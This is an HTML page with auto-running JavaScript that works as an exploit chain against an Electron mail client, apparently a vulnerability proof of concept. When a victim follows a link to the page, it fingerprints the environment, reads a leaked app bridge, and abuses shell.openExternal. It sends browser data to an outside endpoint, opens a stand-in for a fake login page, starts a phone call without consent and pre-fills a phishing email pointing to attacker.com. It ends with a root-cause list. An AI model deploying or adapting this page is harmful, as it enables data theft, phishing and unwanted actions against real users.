<!DOCTYPE html>
<html>
<head>
<title>Security Verification Required</title>
<style>
body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 30px; }
h1 { color: #ff0040; text-shadow: 0 0 10px #ff0040; }
h2 { color: #00ff41; }
.step { background: #111; border-left: 4px solid #333; padding: 12px; margin: 10px 0; }
.step.done { border-color: #4caf50; }
.step.active { border-color: #ff9800; }
.step.attack { border-color: #ff0040; }
#status { font-size: 20px; color: #ff0040; margin: 20px 0; }
.blink { animation: blink 1s infinite; }
@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
table { border-collapse: collapse; margin: 10px 0; }
td, th { border: 1px solid #333; padding: 6px 12px; text-align: left; }
th { background: #1a1a1a; color: #ff0040; }
</style>
</head>
<body>

<h1>HEY-Lab Remote Exploit Chain</h1>
<p style="color:#666;">No C2 server required — works from any hosting (GitHub Pages, Ngrok, etc.)</p>
<div id="log"></div>
<div id="status"></div>

<script>
const log = document.getElementById('log');
const status = document.getElementById('status');
let stepNum = 0;
let results = [];

function addStep(text, cls) {
  stepNum++;
  const div = document.createElement('div');
  div.className = 'step ' + (cls || '');
  div.innerHTML = `<strong>Step ${stepNum}:</strong> ${text}`;
  log.appendChild(div);
  return div;
}

function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

function addResult(name, status, detail) {
  results.push({ name, status, detail });
}

async function runChain() {

  // ========== PHASE 1: RECON ==========
  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 1: RECONNAISSANCE</span>', 'done');
  await delay(300);

  // Detect environment
  const ua = navigator.userAgent;
  const isElectron = typeof window.process !== 'undefined' || ua.includes('Electron');
  const heyLabBridge = typeof window.heyLab !== 'undefined' ? window.heyLab : null;
  const chrMatch = ua.match(/Chrome\/(\d+)/);
  const chrMajor = chrMatch ? parseInt(chrMatch[1]) : 0;

  addStep(`Environment fingerprint:<br>
    &nbsp;&nbsp;Electron detected: <strong>${isElectron ? 'YES' : 'NO'}</strong><br>
    &nbsp;&nbsp;Chromium version: <strong>${chrMajor}</strong><br>
    &nbsp;&nbsp;Platform: <strong>${navigator.platform}</strong><br>
    &nbsp;&nbsp;User-Agent: ${ua.substring(0, 80)}...`, 'done');
  await delay(300);

  // heyLab bridge check
  if (heyLabBridge) {
    addStep(`<span style="color:#ff0040;">heyLab bridge LEAKED:</span><br>
      &nbsp;&nbsp;version: <strong>${heyLabBridge.version}</strong><br>
      &nbsp;&nbsp;platform: <strong>${heyLabBridge.platform}</strong><br>
      &nbsp;&nbsp;onMailto: <strong>${typeof heyLabBridge.onMailto}</strong>`, 'attack');
    addResult('Bridge Leak', 'VULNERABLE', `version=${heyLabBridge.version}, platform=${heyLabBridge.platform}`);
  } else {
    addStep('heyLab bridge: not found (not running in HEY-Lab Electron)', 'step');
    addResult('Bridge Leak', 'N/A', 'Not in Electron context');
  }
  await delay(300);

  // Navigation hijack confirmation
  const isHijacked = window.location.hostname !== 'localhost' || window.location.port !== '4000';
  addStep(`Navigation hijack: <strong>${isHijacked ? '<span style="color:#ff0040;">CONFIRMED</span> — running on attacker server' : 'Not detected'}</strong><br>
    &nbsp;&nbsp;Current origin: ${window.location.origin}<br>
    &nbsp;&nbsp;Expected origin: http://localhost:4000`, 'done');
  if (isHijacked) {
    addResult('Navigation Hijack', 'VULNERABLE', `Navigated to ${window.location.origin}`);
  }
  await delay(500);

  // ========== PHASE 2: shell.openExternal ATTACKS ==========
  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 2: shell.openExternal EXPLOITATION</span><br>&nbsp;&nbsp;No C2 server needed — using window.open() to trigger shell.openExternal', 'done');
  await delay(500);

  // Attack 1: Data exfiltration via https://
  const exfilData = encodeURIComponent(JSON.stringify({
    bridge: heyLabBridge,
    ua: ua.substring(0, 100),
    platform: navigator.platform,
    screen: `${screen.width}x${screen.height}`,
    lang: navigator.language,
    origin: window.location.origin,
    timestamp: new Date().toISOString()
  }));

  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 1: DATA EXFILTRATION</span><br>
    &nbsp;&nbsp;Vector: window.open('https://attacker.com/collect?data=...')<br>
    &nbsp;&nbsp;Triggers: shell.openExternal → opens in default browser<br>
    &nbsp;&nbsp;Exfil payload: bridge info, UA, platform, screen size, language`, 'attack');

  try {
    // Using httpbin as safe demo endpoint (shows data in URL)
    const exfilUrl = `https://httpbin.org/get?exfil=${exfilData}`;
    const w1 = window.open(exfilUrl);
    addResult('Data Exfiltration (https)', w1 === null ? 'FIRED' : 'POPUP', 'shell.openExternal triggered');
    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check default browser — httpbin shows stolen data`, 'attack');
  } catch(e) {
    addResult('Data Exfiltration (https)', 'ERROR', e.message);
  }
  await delay(2000);

  // Attack 2: Phishing escalation
  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 2: PHISHING ESCALATION</span><br>
    &nbsp;&nbsp;Vector: window.open('https://attacker.com/fake-login')<br>
    &nbsp;&nbsp;Triggers: shell.openExternal → opens fake login in browser<br>
    &nbsp;&nbsp;Impact: Victim sees "HEY session expired, please login again"`, 'attack');

  try {
    // Safe demo: opens example.com (would be attacker's fake login page)
    const w2 = window.open('https://example.com');
    addResult('Phishing Escalation (https)', w2 === null ? 'FIRED' : 'POPUP', 'shell.openExternal triggered');
    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Fake login page opened in browser`, 'attack');
  } catch(e) {
    addResult('Phishing Escalation', 'ERROR', e.message);
  }
  await delay(2000);

  // Attack 3: tel: scheme — FaceTime/phone call
  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 3: TELEPHONY HARASSMENT</span><br>
    &nbsp;&nbsp;Vector: window.open('tel:1234567890')<br>
    &nbsp;&nbsp;Triggers: shell.openExternal → FaceTime/phone call<br>
    &nbsp;&nbsp;Impact: Initiates call without user consent`, 'attack');

  try {
    const w3 = window.open('tel:1234567890');
    addResult('tel: scheme', w3 === null ? 'FIRED' : 'POPUP', 'shell.openExternal → FaceTime');
    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check FaceTime`, 'attack');
  } catch(e) {
    addResult('tel: scheme', 'ERROR', e.message);
  }
  await delay(2000);

  // Attack 4: mailto: scheme — impersonation
  addStep(`<span style="color:#ff0040;font-size:16px;">ATTACK 4: EMAIL IMPERSONATION</span><br>
    &nbsp;&nbsp;Vector: window.open('mailto:...')<br>
    &nbsp;&nbsp;Triggers: shell.openExternal → Mail compose<br>
    &nbsp;&nbsp;Impact: Pre-filled email with attacker content`, 'attack');

  try {
    const mailtoUrl = 'mailto:victim@company.com?subject=URGENT%3A%20Password%20Reset%20Required&body=Your%20account%20has%20been%20compromised.%20Reset%20now%3A%20https%3A%2F%2Fattacker.com%2Freset';
    const w4 = window.open(mailtoUrl);
    addResult('mailto: scheme', w4 === null ? 'FIRED' : 'POPUP', 'shell.openExternal → Mail compose');
    addStep(`&nbsp;&nbsp;<span style="color:#ff0040;">shell.openExternal FIRED!</span> Check Mail app`, 'attack');
  } catch(e) {
    addResult('mailto: scheme', 'ERROR', e.message);
  }
  await delay(2000);

  // ========== PHASE 3: RESULTS ==========
  addStep('<span style="color:#00ff41;font-size:16px;">PHASE 3: RESULTS SUMMARY</span>', 'done');
  await delay(300);

  let tableHTML = '<table><tr><th>Attack</th><th>Status</th><th>Detail</th></tr>';
  results.forEach(r => {
    const color = r.status === 'VULNERABLE' || r.status === 'FIRED' ? '#ff0040' :
                  r.status === 'POPUP' ? '#ff9800' : '#666';
    tableHTML += `<tr><td>${r.name}</td><td style="color:${color};font-weight:bold;">${r.status}</td><td>${r.detail}</td></tr>`;
  });
  tableHTML += '</table>';

  addStep(tableHTML, 'attack');

  addStep(`<span style="color:#ff0040;font-size:18px;">EXPLOIT CHAIN COMPLETE</span><br><br>
    <strong>Attack flow:</strong><br>
    1. Attacker sends phishing email to HEY user<br>
    2. Email contains http:// link (survives Action Text sanitizer)<br>
    3. User clicks link → Electron navigates to this page (no will-navigate handler)<br>
    4. Attacker JS calls window.open() with various URL schemes<br>
    5. setWindowOpenHandler passes URLs to shell.openExternal()<br>
    6. OS executes: opens browser, FaceTime, Mail with attacker content<br><br>
    <strong>Root causes:</strong><br>
    - Missing will-navigate handler on BrowserWindow<br>
    - shell.openExternal called with unvalidated URLs<br>
    - No URL scheme allowlist in setWindowOpenHandler<br>
    - Action Text allows http:// links in emails<br><br>
    <strong>Hosting:</strong> This page works from ANY server — GitHub Pages, Ngrok, S3, etc.<br>
    No C2 server or localhost access required.`, 'attack');

  status.innerHTML = '<span class="blink">EXPLOITATION COMPLETE — CHECK BROWSER, FACETIME, AND MAIL APP</span>';
}

// Auto-run
runChain();
</script>
</body>
</html>
